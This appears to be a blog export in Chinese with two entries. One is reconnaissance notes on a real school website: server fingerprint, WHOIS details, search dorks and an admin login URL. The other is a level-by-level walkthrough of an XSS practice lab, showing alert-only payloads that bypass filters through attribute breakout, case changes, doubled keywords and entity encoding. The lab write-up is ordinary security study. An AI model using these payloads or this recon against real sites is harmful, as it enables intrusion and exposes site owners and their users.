src="https://cdn.nlark.com/yuque/0/2021/gif/12570963/1626092192668-ea1ee76d-6a39-4cbe-9114-b61597383068.gif#align=left&display=inline&height=20&margin=%5Bobject%20Object%5D&originHeight=20&originWidth=15&size=0&status=done&style=none&width=15"><img src="https://cdn.nlark.com/yuque/0/2021/gif/12570963/1626092192688-5f8d167b-3be9-44c5-8571-77307ab5752f.gif#align=left&display=inline&height=20&margin=%5Bobject%20Object%5D&originHeight=20&originWidth=15&size=0&status=done&style=none&width=15"><img src="https://cdn.nlark.com/yuque/0/2021/gif/12570963/1626092192698-92ae340d-e05b-4348-a269-a8d6e9f78677.gif#align=left&display=inline&height=20&margin=%5Bobject%20Object%5D&originHeight=20&originWidth=15&size=0&status=done&style=none&width=15"><img src="https://cdn.nlark.com/yuque/0/2021/gif/12570963/1626092192691-46f6a3a0-7312-4515-b63a-38cb3a568dc1.gif#align=left&display=inline&height=20&margin=%5Bobject%20Object%5D&originHeight=20&originWidth=15&size=0&status=done&style=none&width=15"><img src="https://cdn.nlark.com/yuque/0/2021/gif/12570963/1626092192918-1b6572c7-96e4-4b6e-a908-21294d1e2d62.gif#align=left&display=inline&height=20&margin=%5Bobject%20Object%5D&originHeight=20&originWidth=15&size=0&status=done&style=none&width=15"> 位访问者 |</p>
<p><a href="http://www.pyyszx.cn/">http://www.pyyszx.cn</a> [200 OK] Apache[2.4.23], Country[CHINA][CN], HTTPServer[Windows (32 bit)][Apache/2.4.23 (Win32) OpenSSL/1.0.2j], IP[114.118.11.54], OpenSSL[1.0.2j], Script</p>
<p>Domain Name: pyyszx.cn<br>ROID: 20150107s10001s73619105-cn<br>Domain Status: ok<br>Registrant: 濮阳市油田艺术中学       地址<br>Registrant Contact Email: <a href="mailto:&#106;&#x78;&#56;&#49;&#57;&#64;&#x31;&#50;&#54;&#x2e;&#x63;&#111;&#x6d;">&#106;&#x78;&#56;&#49;&#57;&#64;&#x31;&#50;&#54;&#x2e;&#x63;&#111;&#x6d;</a>    邮箱<br>Sponsoring Registrar: 成都世纪东方网络通信有限公司  组织<br>Name Server: ns.cdnhost.cn    服务器<br>Name Server: ns.dnsfamily.com<br>Registration Time: 2015-01-07 15:09:21<br>Expiration Time: 2022-01-07 15:09:21</p>
<p>inurl:<em>.pyyszx.cn<br>site:</em>.pyyszx.cn</p>
<p><a href="http://www.pyyszx.cn/baishuadmin/">http://www.pyyszx.cn/baishuadmin/</a>后台管理<br><a href="http://www.pyyszx.cn/reg.php">http://www.pyyszx.cn/reg.php</a>注册</p>
<p>Server:         192.168.3.1<br>Address:        192.168.3.1#53<br>Non-authoritative answer:<br>Name:   <a href="http://www.pyyszx.cn/">www.pyyszx.cn</a><br>Address: 114.118.11.54
                 </p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1626093567166-d47a0bfd-6df3-4979-afc1-c14b7e39f22b.png#align=left&display=inline&height=77&margin=%5Bobject%20Object%5D&name=image.png&originHeight=154&originWidth=370&size=22665&status=done&style=none&width=185" alt="image.png"></p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2021/08/04/XSS%E9%9D%B6%E5%9C%BA/</url>
    <content><![CDATA[<h1 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627706143824-ebcd923f-cadb-4309-9fd0-049b1e60e035.png#align=left&display=inline&height=406&margin=%5Bobject%20Object%5D&name=image.png&originHeight=812&originWidth=1068&size=147387&status=done&style=none&width=534" alt="image.png"><br>利用语句进行弹窗测试就可以<br><code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627706206918-a879298f-69e8-4871-b6da-6b059b6a3e31.png#align=left&display=inline&height=338&margin=%5Bobject%20Object%5D&name=image.png&originHeight=675&originWidth=1428&size=65116&status=done&style=none&width=714" alt="image.png"></p>
<h1 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627706252323-14e61740-a651-4e14-80c2-3a24e4bdb2ce.png#align=left&display=inline&height=282&margin=%5Bobject%20Object%5D&name=image.png&originHeight=564&originWidth=830&size=74146&status=done&style=none&width=415" alt="image.png"></p>
<p>可以发现本题依然是根据GET传参数，查看源代码<img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627706317906-c4d39740-e32c-49a5-b2a5-ab35e128ed46.png#align=left&display=inline&height=142&margin=%5Bobject%20Object%5D&name=image.png&originHeight=284&originWidth=578&size=19798&status=done&style=none&width=289" alt="image.png"><br>这是一个value进行输入，使用js恶意代码拼接</p>
<p>构造payload：<code>&quot;/&gt;&lt;script&gt;alert(2)&lt;/script&gt;//</code><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627706490971-9191b4c6-54e6-4fde-87fe-b50e289eb797.png#align=left&display=inline&height=339&margin=%5Bobject%20Object%5D&name=image.png&originHeight=677&originWidth=1613&size=81924&status=done&style=none&width=806.5" alt="image.png"></p>
<h1 id="xss秘籍第三式（绕函弹）"><a href="#xss秘籍第三式（绕函弹）" class="headerlink" title="xss秘籍第三式（绕函弹）"></a>xss秘籍第三式（绕函弹）</h1><p>根据流程来：<br>一、查看页面，任然是GET型，都是GET型哪有什么区别呢，查看源代码查看<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627706761663-a3c78775-c7dd-4e33-96e2-3d4ca315f07f.png#align=left&display=inline&height=47&margin=%5Bobject%20Object%5D&name=image.png&originHeight=93&originWidth=883&size=7185&status=done&style=none&width=441.5" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627706842090-054f4ff4-b592-4c3b-a634-bd09e7cd751e.png#align=left&display=inline&height=146&margin=%5Bobject%20Object%5D&name=image.png&originHeight=291&originWidth=998&size=21855&status=done&style=none&width=499" alt="image.png"><br>仍然是value输入，但是这次是空的值，仍然进行js恶意代码输入</p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627707001301-7411faaf-7b0b-47f8-b61e-50af3437784d.png#align=left&display=inline&height=348&margin=%5Bobject%20Object%5D&name=image.png&originHeight=695&originWidth=1172&size=93971&status=done&style=none&width=586" alt="image.png"></p>
<p>没有弹窗，构造payload,还是没有反应<br><code>&quot;/&gt;&lt;img src=# onerror=alert(1)/&gt;//</code></p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627707106934-d7b50abb-5281-426c-b6fe-2286d916e687.png#align=left&display=inline&height=302&margin=%5Bobject%20Object%5D&name=image.png&originHeight=603&originWidth=1255&size=83291&status=done&style=none&width=627.5" alt="image.png"></p>
<p>为什么都用不了！！！<br>大概是后端使用了<code>**htmlspecialchars**</code>函数进行过滤，因此我们可以使用不带有尖括号的特殊字符进行尝试：<br><code>&#39; onmouseover=&#39;javascript:alert(1)</code></p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627707548465-40136334-82be-44c7-9897-70be1e4ebaa8.png#align=left&display=inline&height=312&margin=%5Bobject%20Object%5D&name=image.png&originHeight=623&originWidth=1324&size=84336&status=done&style=none&width=662" alt="image.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627707663005-b592ba70-cb10-46e2-9bf3-37a7a1334535.png#align=left&display=inline&height=321&margin=%5Bobject%20Object%5D&originHeight=321&originWidth=448&size=0&status=done&style=none&width=448"></p>
<p>至于为什么要使用<code>&#39;</code>这是因为<br><code>&lt;input type=&#39;text&#39; value=&#39; &amp;#039 onmouseover=&amp;#039 javascript:alert(1)&#39;&gt;</code><br>只有使用单引号，转换出来的<code>&amp;#039</code>才有意义</p>
<h1 id="xss秘籍第四式（构绕函弹）"><a href="#xss秘籍第四式（构绕函弹）" class="headerlink" title="xss秘籍第四式（构绕函弹）"></a>xss秘籍第四式（构绕函弹）</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627707936384-787ad814-6eb7-43dd-9c21-1130e5573858.png#align=left&display=inline&height=282&margin=%5Bobject%20Object%5D&name=image.png&originHeight=564&originWidth=1125&size=92573&status=done&style=none&width=562.5" alt="image.png"></p>
<p>这是我们再拿第三关的payload进行尝试我们发现已经没有任何作用<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627707990966-3227d284-8268-4501-bfa1-ed6d41c33082.png#align=left&display=inline&height=356&margin=%5Bobject%20Object%5D&name=image.png&originHeight=712&originWidth=1535&size=127876&status=done&style=none&width=767.5" alt="image.png"></p>
<p>老样子查看一下源代码，我也没有发现什么。。。。看一下大佬们的解释<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627708247630-3bdc814d-5b73-4b5d-863d-121f5ffcba4f.png#align=left&display=inline&height=89&margin=%5Bobject%20Object%5D&name=image.png&originHeight=178&originWidth=1039&size=165973&status=done&style=none&width=519.5" alt="image.png"></p>
<p>让我们跟着思路走下去<br>构造payload:<code>1、</code><br><code> </code><br><code>         2、 &quot;onmouseover=&#39;alert(1)&#39; </code></p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627708551823-b4e7a9dd-e310-4ce1-8336-b8ada47400e2.png#align=left&display=inline&height=451&margin=%5Bobject%20Object%5D&name=image.png&originHeight=903&originWidth=1487&size=145089&status=done&style=none&width=743.5" alt="image.png"></p>
<p>这不就可以了嘛</p>
<h1 id="xss秘籍第五关-（闭新java弹）"><a href="#xss秘籍第五关-（闭新java弹）" class="headerlink" title="xss秘籍第五关 （闭新java弹）"></a>xss秘籍第五关 （闭新java弹）</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627708650624-5d2e1ac2-e60d-4c9d-8146-14b3aab3a49e.png#align=left&display=inline&height=281&margin=%5Bobject%20Object%5D&name=image.png&originHeight=562&originWidth=793&size=58621&status=done&style=none&width=396.5" alt="image.png"></p>
<p>是不是跟第四关差不多嘞，但是这可是第五关呐！！！啊这，肯定比第四关更难吧<br>问题不大，让我们先用第四关的方法进行尝试<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627708758941-0e69a7e9-374e-41a4-a6f3-5227ab356033.png#align=left&display=inline&height=404&margin=%5Bobject%20Object%5D&name=image.png&originHeight=808&originWidth=1357&size=103051&status=done&style=none&width=678.5" alt="image.png"></p>
<p>可以发现，这里闭合了on,尝试大小写绕过<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627708823792-f10acfc6-a769-46f9-8393-cf6e7916cfd8.png#align=left&display=inline&height=355&margin=%5Bobject%20Object%5D&name=image.png&originHeight=710&originWidth=1432&size=94804&status=done&style=none&width=716" alt="image.png"><br>还是仍然对on产生了绕过，尝试编码<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627709048199-88ea66f6-2d3f-4821-9d9f-8350adcabdaf.png#align=left&display=inline&height=367&margin=%5Bobject%20Object%5D&name=image.png&originHeight=733&originWidth=1351&size=93595&status=done&style=none&width=675.5" alt="image.png"><br>发现编码也不行……….</p>
<p>既然都不行，就回到最处思考使用&lt;&gt;操作<br>构造payload:<code>&quot;/&gt;&lt;a href=&quot;javascript:alert(1)&quot;/&gt;</code></p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627709212844-6826273f-223c-4f83-9d62-e476314353fb.png#align=left&display=inline&height=408&margin=%5Bobject%20Object%5D&name=image.png&originHeight=816&originWidth=1492&size=112763&status=done&style=none&width=746" alt="image.png"></p>
<p>似乎什么也没有，又似乎发现了什么！！<br>似乎发现了被单独弥留下来的一个超链接版的xss代码，我们点击进行尝试，很不错，这个链接尽然弹出了xss代码</p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627709310268-4886b33a-6846-410c-a904-314412788aeb.png#align=left&display=inline&height=81&margin=%5Bobject%20Object%5D&name=image.png&originHeight=161&originWidth=930&size=18341&status=done&style=none&width=465" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627709294047-bf9b6b1f-3fcf-4841-9634-ac0d58a50192.png#align=left&display=inline&height=165&margin=%5Bobject%20Object%5D&name=image.png&originHeight=329&originWidth=1062&size=38457&status=done&style=none&width=531" alt="image.png"></p>
<h1 id="xss秘籍第六关（大小写）"><a href="#xss秘籍第六关（大小写）" class="headerlink" title="xss秘籍第六关（大小写）"></a>xss秘籍第六关（大小写）</h1><p>还是先使用上一关的payload<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627800669185-f80bed73-d9c7-42ed-8c4e-7861e0627ef7.png#align=left&display=inline&height=237&margin=%5Bobject%20Object%5D&name=image.png&originHeight=474&originWidth=1243&size=102015&status=done&style=none&width=621.5" alt="image.png"></p>
<p>查看一下源代码<img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627800696465-5b35c42c-2883-42a4-a850-00d245c7ed13.png#align=left&display=inline&height=76&margin=%5Bobject%20Object%5D&name=image.png&originHeight=151&originWidth=817&size=14241&status=done&style=none&width=408.5" alt="image.png"></p>
<p>可见是过滤了href，在这里使用的是大小写进行过滤：<br><code>&quot; /&gt; &lt;a Href=&quot;javascript:alert(1)&quot;/&gt;</code><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627801004209-cb96219c-3e7c-415f-9c21-a8afab1c12e9.png#align=left&display=inline&height=371&margin=%5Bobject%20Object%5D&name=image.png&originHeight=742&originWidth=1258&size=127478&status=done&style=none&width=629" alt="image.png"></p>
<p>完成了<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627801024904-f6fbf88f-e8f8-4bf8-b946-efffa7fe6884.png#align=left&display=inline&height=379&margin=%5Bobject%20Object%5D&name=image.png&originHeight=758&originWidth=1346&size=109544&status=done&style=none&width=673" alt="image.png"></p>
<h1 id="xss秘籍第七关（重复写）"><a href="#xss秘籍第七关（重复写）" class="headerlink" title="xss秘籍第七关（重复写）"></a>xss秘籍第七关（重复写）</h1><p>老方法，上一关payload进行尝试<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627801162187-2e7c466d-5adb-41e1-9ae4-958735a582f0.png#align=left&display=inline&height=416&margin=%5Bobject%20Object%5D&name=image.png&originHeight=831&originWidth=1434&size=103075&status=done&style=none&width=717" alt="image.png"></p>
<p>value什么也没有输出，可见是被过滤了，我们换个关键词试试<br><code>&quot;/&gt;&lt;img src=&#39;javascript:alert(1)&#39;&gt;//</code></p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627801405391-20a23be4-f88c-401c-88cf-091d56c0e578.png#align=left&display=inline&height=361&margin=%5Bobject%20Object%5D&name=image.png&originHeight=721&originWidth=1675&size=108313&status=done&style=none&width=837.5" alt="image.png"></p>
<p>这应该是对关键词进行了过滤操作，也就不能使用SRC、herf等一些关键词出发xss的恶意js，是否可以使用不用到这些都标签构造payload。。<br>But….连script标签也被过滤的，这就让人很头大！！</p>
<p>那么现在需要考虑如何进行<code>script</code>绕过，就是我们需要解决的事情了，先尝试大小写<br><code>&quot;/&gt;&lt;Script&gt;alert(xss)&lt;/Script&gt;//&lt;</code><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627801858161-e2b9c9a4-4085-45bb-bfb0-8bba204d75da.png#align=left&display=inline&height=378&margin=%5Bobject%20Object%5D&name=image.png&originHeight=757&originWidth=1507&size=106081&status=done&style=none&width=753.5" alt="image.png"></p>
<p>可见还是被过滤了<br>没关系，绕过的方式很多，再尝试重复进行尝试<br><code>&quot;/&gt;&lt;ScrscriptipT&gt;alert(&quot;xss&quot;)&lt;/ScriscriptPT&gt;//&lt;</code><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627802251651-7e1942ba-dc0f-4769-b084-f73a0adffcff.png#align=left&display=inline&height=265&margin=%5Bobject%20Object%5D&name=image.png&originHeight=529&originWidth=1719&size=63298&status=done&style=none&width=859.5" alt="image.png"></p>
<p>哦豁，小心机</p>
<h1 id="xss秘籍第八关（DOM）"><a href="#xss秘籍第八关（DOM）" class="headerlink" title="xss秘籍第八关（DOM）"></a>xss秘籍第八关（DOM）</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627802815082-62dcbe17-c7d1-4341-ab8e-26d0efb98f3f.png#align=left&display=inline&height=281&margin=%5Bobject%20Object%5D&name=image.png&originHeight=562&originWidth=1888&size=151846&status=done&style=none&width=944" alt="image.png"></p>
<p>要添加友情链接，这一关很可能属于DOM型xss，因此需要根据友情链接进行恶意js构造<br>这样我们又回到了第五关了：<code>javascript:alert(1)</code><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627803515009-e6b78d52-d46c-4638-be6d-b02ae5beb718.png#align=left&display=inline&height=106&margin=%5Bobject%20Object%5D&name=image.png&originHeight=212&originWidth=414&size=11474&status=done&style=none&width=207" alt="image.png">一个小知识点<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627803124604-26ace6fd-921a-4182-85b5-2d43d27cc7aa.png#align=left&display=inline&height=421&margin=%5Bobject%20Object%5D&name=image.png&originHeight=841&originWidth=1364&size=166737&status=done&style=none&width=682" alt="image.png"></p>
<p>javascript被过滤了，尝试绕过老样子：大小写、重复<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627803697915-cbbec139-16d9-4509-9e75-6df68841660e.png#align=left&display=inline&height=379&margin=%5Bobject%20Object%5D&name=image.png&originHeight=758&originWidth=1373&size=162429&status=done&style=none&width=686.5" alt="image.png"></p>
<p>都不行，怎么呢，也不能替换，小问题<img src="https://cdn.nlark.com/yuque/0/2021/gif/12570963/1627803761630-cc80f855-efae-41f5-90b6-8f53063436c5.gif#align=left&display=inline&height=113&margin=%5Bobject%20Object%5D&originHeight=315&originWidth=315&size=0&status=done&style=none&width=113"><br>还可以对关键词进行编码，在这里我们使用16进制进行编码，至于其他编码方式也是可以的<br><code>javascrip&amp;#x74:alert(1)</code><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627804083230-3d6b93f2-f5ee-47ad-a7c9-c8671e663732.png#align=left&display=inline&height=214&margin=%5Bobject%20Object%5D&name=image.png&originHeight=428&originWidth=723&size=50446&status=done&style=none&width=361.5" alt="image.png"></p>
<p>这不就好了</p>
<h1 id="xss秘籍第九关（代码审计）"><a href="#xss秘籍第九关（代码审计）" class="headerlink" title="xss秘籍第九关（代码审计）"></a>xss秘籍第九关（代码审计）</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627804267764-cf6f34a0-0c43-4bad-9505-b9c0a09b739b.png#align=left&display=inline&height=435&margin=%5Bobject%20Object%5D&name=image.png&originHeight=869&originWidth=1831&size=205641&status=done&style=none&width=915.5" alt="image.png"></p>
<p>到了这一关就不仅仅是对源代码进行分析了，找到文件的php代码进行审计<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627804339096-5e13d4cf-c078-479b-bf75-cf153d43b5b3.png#align=left&display=inline&height=218&margin=%5Bobject%20Object%5D&name=image.png&originHeight=436&originWidth=970&size=36331&status=done&style=none&width=485" alt="image.png"></p>
<p>尝试进行弹窗<code>&quot;/&gt;&lt;a href=&#39;javascript:alert(1)&#39;/&gt;</code></p>
<p>查看源文件并没有发现什么，这一关不知道为什么好卡！！应该是出了什么问题，去看一下大佬们的笔记<br>发现这是一个对<code>https://</code>字符的操作，不能出现https字样，只能是**http:// ** 这几个字符，不然就会返回链接不合法</p>
<p>因此构造payload时只需要出现http:// 的字样，并且在尝试过程中，对script进行了过滤，所以我么根据上一关的经验去构造<br><code>javascrip&amp;#x74:alert(1)//http://www.san.com</code></p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627806408261-8fb7de8d-c38b-4ec4-b0cb-6e9085d4f580.png#align=left&display=inline&height=381&margin=%5Bobject%20Object%5D&name=image.png&originHeight=762&originWidth=1743&size=145354&status=done&style=none&width=871.5" alt="image.png"></p>
<p>这样就成功了，至于后面的链接，随意根据格式写就可以</p>
<h1 id="xss秘籍第十关（改类型）"><a href="#xss秘籍第十关（改类型）" class="headerlink" title="xss秘籍第十关（改类型）"></a>xss秘籍第十关（改类型）</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627806813331-465e7b4f-0994-4d2a-82d5-45c23dfb845e.png#align=left&display=inline&height=438&margin=%5Bobject%20Object%5D&name=image.png&originHeight=875&originWidth=1149&size=288614&status=done&style=none&width=574.5" alt="image.png"></p>
<p>可能有隐藏的表单，尝试提交t_link、t_history、t_sort变量，t_sort变量返回在了html的value中，但是过滤了尖括号<br>也就是存在get参数又隐藏框，经尝试t_sort存在<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627807315698-ea45c299-a17d-430a-b1d3-7952c5366150.png#align=left&display=inline&height=465&margin=%5Bobject%20Object%5D&name=image.png&originHeight=929&originWidth=893&size=277279&status=done&style=none&width=446.5" alt="image.png"><br>而剩下的两个参数则不存在<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627807359101-b27b739e-f556-458e-a643-ebbc84c8cc0e.png#align=left&display=inline&height=465&margin=%5Bobject%20Object%5D&name=image.png&originHeight=930&originWidth=851&size=276466&status=done&style=none&width=425.5" alt="image.png"><br>type是为了让页面展现出一个输入框，一点击就会弹出alert<br>构造payload:<code>123&amp;t_sort=&quot;type=&quot;text&quot; onclick=&quot;alert(1)</code>(输入的文本都无法显示，这里只能改变一下keyword的类型，type=text)<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627807583196-4b7c0366-0aaa-467e-81aa-3ff5665f770a.png#align=left&display=inline&height=324&margin=%5Bobject%20Object%5D&name=image.png&originHeight=647&originWidth=1611&size=178045&status=done&style=none&width=805.5" alt="image.png"></p>
<p>今天就到这里了</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>下面两个链接是发现的一些绕过姿势<br><a href="https://www.cnblogs.com/H4ck3R-XiX/p/12732356.html">绕过总结</a><br><a href="https://blog.csdn.net/qq_29277155/article/details/51320064">绕过总结</a></p>
]]></content>
  </entry>
</search>
